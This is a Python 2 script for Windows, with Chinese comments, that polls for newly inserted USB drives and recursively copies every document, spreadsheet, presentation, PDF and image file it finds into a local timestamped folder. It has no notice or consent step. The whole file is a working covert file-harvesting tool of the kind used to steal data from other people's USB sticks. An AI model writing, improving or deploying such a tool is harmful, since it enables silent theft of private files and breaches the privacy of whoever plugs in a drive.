# coding:utf-8
import platform
import threading
import ctypes
import time
import os
import shutil

old_disk = []
new_disk = []

disk_in = []
disk_out = []

target_path = 'copyfile\\'                                                                  #拷贝路径主目录
file_type = (
'.txt', '.psd', '.jpg', '.doc', '.ppt', '.cpp', '.xls', '.pdf', '.ms10', '.pdf', '.jpeg', '.png', '.gif', '.TXT',
'.DOC', '.PPT', '.CPP', '.XLS', '.xlsx', '.PDF', '.MS10', '.PDF', '.JPG', '.JPEG', '.PNG', '.GIF', '.pptx')


def system_type():                                                                          # 检测系统类型
    system = platform.system()
    print '[*]System You Are Using: %s' % system
    return system


def detect_usb(old_disk, new_disk):                                                         # 检测U盘热拔插

    global disk_in, disk_out
    while True:
        if len(old_disk) == 0:
            lpBuffer = ctypes.create_string_buffer(78)
            ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
            old_disk = lpBuffer.raw.replace('\x00', '').split('\\')
            new_disk = old_disk

        if len(new_disk) != 0:
            lpBuffer = ctypes.create_string_buffer(78)
            ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
            new_disk = lpBuffer.raw.replace('\x00', '').split('\\')

        disk_in = list(set(new_disk).difference(set(old_disk)))
        disk_out = list(set(old_disk).difference(set(new_disk)))
        if len(disk_in) > 0:
            print '[*]New Usb Device In : %s' % disk_in
            old_disk = new_disk
        if len(disk_out) > 0:
            print '[*]Usb Device Out : %s' % disk_out
            old_disk = new_disk
        time.sleep(3)


def read_path(path_name, record_time):                                                      # 读取相应后缀的文件
    copy_path = os.path.join(target_path, record_time)                                      # 创建拷贝时间文件夹
    if os.path.exists(copy_path):
        pass
    else:
        os.mkdir(copy_path)

    file_list = []
    for dir_item in os.listdir(path_name):
        full_path = os.path.abspath(os.path.join(path_name, dir_item))
        if os.path.isdir(full_path):
            read_path(full_path, record_time)                                               # 递归读取目录
        else:
            if dir_item.startswith('_.') or dir_item.startswith('._'):                      # 忽略前缀为'-.'和'.-'的缓存文件
                pass
            else:
                if dir_item.endswith(file_type):                                            # 如果后缀符合要求，则开始拷贝
                    copy_file(full_path, copy_path, dir_item)
                    file_list.append(full_path)
                    # return file_list


def copy_file(file_path, copy_path, dir_item):                                              # 拷贝文件函数
    copy_path = os.path.join(copy_path, dir_item)
    shutil.copyfile(file_path, copy_path)


if __name__ == '__main__':
    system = system_type()
    disk_handler = threading.Thread(target=detect_usb, args=(old_disk, new_disk,))
    disk_handler.start()
    while True:
        if len(disk_in) != 0:
            record_time = time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time()))  # 记录拷贝时间
            # file_list= read_path(disk_in[0],record_time)
            read_path(disk_in[0], record_time)
            disk_in = []
